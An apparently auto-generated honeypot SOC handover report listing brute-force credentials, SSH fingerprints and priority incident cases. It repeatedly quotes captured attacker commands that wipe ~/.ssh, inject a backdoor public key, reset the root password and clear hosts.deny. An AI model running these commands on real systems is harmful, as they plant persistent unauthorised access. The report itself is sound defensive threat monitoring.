# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-04 |
| **Generated At** | 2026-04-04T22:28:32Z |
| **Shift Time** | 22:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **76** |
| Confirmed Threats | **72** |
| False Positives Filtered | **4** (5.3%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **14** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **60** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **44** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **19** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `345gs5662d34` | 7 |
| `test` | 3 |
| `postgres` | 2 |
| `ubuntu` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 6 |
| `root2018` | 2 |
| `123456a@` | 2 |
| `0987654321` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 6 |
| `root` | `root2018` | 2 |
| `postgres` | `0987654321` | 1 |
| `Operator` | `marketing` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root2018` | `222.100.159.2` | 2026-04-04T20:50:33 |
| `root` | `root2018` | `84.238.92.245` | 2026-04-04T20:50:40 |
| `root` | `Qazwsx2021!` | `154.198.215.50` | 2026-04-04T21:14:48 |
| `root` | `3245gs5662d34` | `154.198.215.50` | 2026-04-04T21:14:54 |
| `root` | `123-asdf` | `13.81.183.28` | 2026-04-04T21:48:38 |
| `root` | `3245gs5662d34` | `13.81.183.28` | 2026-04-04T21:48:42 |
| `root` | `123123@Aa` | `13.81.183.28` | 2026-04-04T21:49:31 |
| `root` | `online@123` | `13.81.183.28` | 2026-04-04T21:52:12 |
| `root` | `Root1111#` | `13.81.183.28` | 2026-04-04T21:55:11 |
| `root` | `passw0rd.` | `13.81.183.28` | 2026-04-04T21:57:10 |
| `root` | `123456a@` | `14.103.123.232` | 2026-04-04T21:58:10 |
| `root` | `root2023@@` | `13.81.183.28` | 2026-04-04T21:58:11 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **76** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 50 |
| OpenSSH | 15 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 49 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 15 | 14 |
| `2aec6b44b06b...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 49 | 3 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 15 | 14 | Mirai/variant |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ASUYIL22JHGV"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.123.232`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `13.81.183.28`, `154.198.215.50`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **22** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS40065` | CNSERVERS LLC | 1 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 1 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS136323` | Ngc Broadband Pvt. Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c5ba0eb35d48

| Field | Detail |
|---|---|
| **Source IP** | `222.100.159[.]2` |
| **First Seen** | 2026-04-04 20:50 |
| **Last Seen** | 2026-04-04 20:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:50:30` | `cowrie.session.connect` |
| `2026-04-04 20:50:31` | `cowrie.client.version` |
| `2026-04-04 20:50:31` | `cowrie.client.kex` |
| `2026-04-04 20:50:33` | `cowrie.login.success` |
| `2026-04-04 20:50:33` | `cowrie.direct-tcpip.request` |
| `2026-04-04 20:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.100.159[.]2` to AbuseIPDB if not already reported
- [ ] Block `222.100.159[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6907ee67ea16

| Field | Detail |
|---|---|
| **Source IP** | `84.238.92[.]245` |
| **First Seen** | 2026-04-04 20:50 |
| **Last Seen** | 2026-04-04 20:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:50:38` | `cowrie.session.connect` |
| `2026-04-04 20:50:39` | `cowrie.client.version` |
| `2026-04-04 20:50:39` | `cowrie.client.kex` |
| `2026-04-04 20:50:40` | `cowrie.login.success` |
| `2026-04-04 20:50:40` | `cowrie.direct-tcpip.request` |
| `2026-04-04 20:50:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.238.92[.]245` to AbuseIPDB if not already reported
- [ ] Block `84.238.92[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6348fd0be368

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-04 21:14 |
| **Last Seen** | 2026-04-04 21:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:14:47` | `cowrie.session.connect` |
| `2026-04-04 21:14:47` | `cowrie.client.version` |
| `2026-04-04 21:14:48` | `cowrie.client.kex` |
| `2026-04-04 21:14:48` | `cowrie.login.success` |
| `2026-04-04 21:14:49` | `cowrie.session.params` |
| `2026-04-04 21:14:49` | `cowrie.command.input` |
| `2026-04-04 21:14:49` | `cowrie.command.failed` |
| `2026-04-04 21:14:49` | `cowrie.log.closed` |
| `2026-04-04 21:14:50` | `cowrie.session.params` |
| `2026-04-04 21:14:50` | `cowrie.command.input` |
| `2026-04-04 21:14:50` | `cowrie.session.file_download` |
| `2026-04-04 21:14:50` | `cowrie.log.closed` |
| `2026-04-04 21:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-122217aa0bc4

| Field | Detail |
|---|---|
| **Source IP** | `154.198.215[.]50` |
| **First Seen** | 2026-04-04 21:14 |
| **Last Seen** | 2026-04-04 21:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:14:53` | `cowrie.session.connect` |
| `2026-04-04 21:14:53` | `cowrie.client.version` |
| `2026-04-04 21:14:53` | `cowrie.client.kex` |
| `2026-04-04 21:14:54` | `cowrie.login.success` |
| `2026-04-04 21:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.198.215[.]50` to AbuseIPDB if not already reported
- [ ] Block `154.198.215[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f783c9fd53

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:48 |
| **Last Seen** | 2026-04-04 21:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:48:38` | `cowrie.session.connect` |
| `2026-04-04 21:48:38` | `cowrie.client.version` |
| `2026-04-04 21:48:38` | `cowrie.client.kex` |
| `2026-04-04 21:48:38` | `cowrie.login.success` |
| `2026-04-04 21:48:39` | `cowrie.session.params` |
| `2026-04-04 21:48:39` | `cowrie.command.input` |
| `2026-04-04 21:48:39` | `cowrie.command.failed` |
| `2026-04-04 21:48:39` | `cowrie.log.closed` |
| `2026-04-04 21:48:39` | `cowrie.session.params` |
| `2026-04-04 21:48:39` | `cowrie.command.input` |
| `2026-04-04 21:48:39` | `cowrie.session.file_download` |
| `2026-04-04 21:48:39` | `cowrie.log.closed` |
| `2026-04-04 21:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbf8d04c3c08

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:48 |
| **Last Seen** | 2026-04-04 21:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:48:41` | `cowrie.session.connect` |
| `2026-04-04 21:48:41` | `cowrie.client.version` |
| `2026-04-04 21:48:41` | `cowrie.client.kex` |
| `2026-04-04 21:48:42` | `cowrie.login.success` |
| `2026-04-04 21:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-533ab5f0fc7b

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:49 |
| **Last Seen** | 2026-04-04 21:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:49:30` | `cowrie.session.connect` |
| `2026-04-04 21:49:30` | `cowrie.client.version` |
| `2026-04-04 21:49:30` | `cowrie.client.kex` |
| `2026-04-04 21:49:31` | `cowrie.login.success` |
| `2026-04-04 21:49:31` | `cowrie.session.params` |
| `2026-04-04 21:49:31` | `cowrie.command.input` |
| `2026-04-04 21:49:31` | `cowrie.command.failed` |
| `2026-04-04 21:49:31` | `cowrie.log.closed` |
| `2026-04-04 21:49:32` | `cowrie.session.params` |
| `2026-04-04 21:49:32` | `cowrie.command.input` |
| `2026-04-04 21:49:32` | `cowrie.session.file_download` |
| `2026-04-04 21:49:32` | `cowrie.log.closed` |
| `2026-04-04 21:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1243aef0113d

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:49 |
| **Last Seen** | 2026-04-04 21:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:49:34` | `cowrie.session.connect` |
| `2026-04-04 21:49:34` | `cowrie.client.version` |
| `2026-04-04 21:49:34` | `cowrie.client.kex` |
| `2026-04-04 21:49:34` | `cowrie.login.success` |
| `2026-04-04 21:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57ab23e93cf

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:52 |
| **Last Seen** | 2026-04-04 21:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:52:11` | `cowrie.session.connect` |
| `2026-04-04 21:52:11` | `cowrie.client.version` |
| `2026-04-04 21:52:11` | `cowrie.client.kex` |
| `2026-04-04 21:52:12` | `cowrie.login.success` |
| `2026-04-04 21:52:12` | `cowrie.session.params` |
| `2026-04-04 21:52:12` | `cowrie.command.input` |
| `2026-04-04 21:52:12` | `cowrie.command.failed` |
| `2026-04-04 21:52:12` | `cowrie.log.closed` |
| `2026-04-04 21:52:12` | `cowrie.session.params` |
| `2026-04-04 21:52:12` | `cowrie.command.input` |
| `2026-04-04 21:52:13` | `cowrie.session.file_download` |
| `2026-04-04 21:52:13` | `cowrie.log.closed` |
| `2026-04-04 21:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe20702c2db9

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:52 |
| **Last Seen** | 2026-04-04 21:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:52:15` | `cowrie.session.connect` |
| `2026-04-04 21:52:15` | `cowrie.client.version` |
| `2026-04-04 21:52:15` | `cowrie.client.kex` |
| `2026-04-04 21:52:15` | `cowrie.login.success` |
| `2026-04-04 21:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76567f8fb47

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:55 |
| **Last Seen** | 2026-04-04 21:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:55:11` | `cowrie.session.connect` |
| `2026-04-04 21:55:11` | `cowrie.client.version` |
| `2026-04-04 21:55:11` | `cowrie.client.kex` |
| `2026-04-04 21:55:11` | `cowrie.login.success` |
| `2026-04-04 21:55:12` | `cowrie.session.params` |
| `2026-04-04 21:55:12` | `cowrie.command.input` |
| `2026-04-04 21:55:12` | `cowrie.command.failed` |
| `2026-04-04 21:55:12` | `cowrie.log.closed` |
| `2026-04-04 21:55:12` | `cowrie.session.params` |
| `2026-04-04 21:55:12` | `cowrie.command.input` |
| `2026-04-04 21:55:12` | `cowrie.session.file_download` |
| `2026-04-04 21:55:12` | `cowrie.log.closed` |
| `2026-04-04 21:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a4a8af69eb

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:55 |
| **Last Seen** | 2026-04-04 21:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:55:14` | `cowrie.session.connect` |
| `2026-04-04 21:55:14` | `cowrie.client.version` |
| `2026-04-04 21:55:15` | `cowrie.client.kex` |
| `2026-04-04 21:55:15` | `cowrie.login.success` |
| `2026-04-04 21:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfe78eae0efe

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-04 21:57 |
| **Last Seen** | 2026-04-04 21:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 21:57:09` | `cowrie.session.connect` |
| `2026-04-04 21:57:09` | `cowrie.client.version` |
| `2026-04-04 21:57:09` | `cowrie.client.kex` |
| `2026-04-04 21:57:10` | `cowrie.login.success` |
| `2026-04-04 21:57:10` | `cowrie.session.params` |
| `2026-04-04 21:57:10` | `cowrie.command.input` |
| `2026-04-04 21:57:10` | `cowrie.command.failed` |
| `2026-04-04 21:57:10` | `cowrie.log.closed` |
| `2026-04-04 21:57:11` | `cowrie.session.params` |
| `2026-04-04 21:57:11` | `cowrie.command.input` |
| `2026-04-04 21:57:11` | `cowrie.session.file_download` |
| `2026-04-04 21:57:11` | `cowrie.log.closed` |
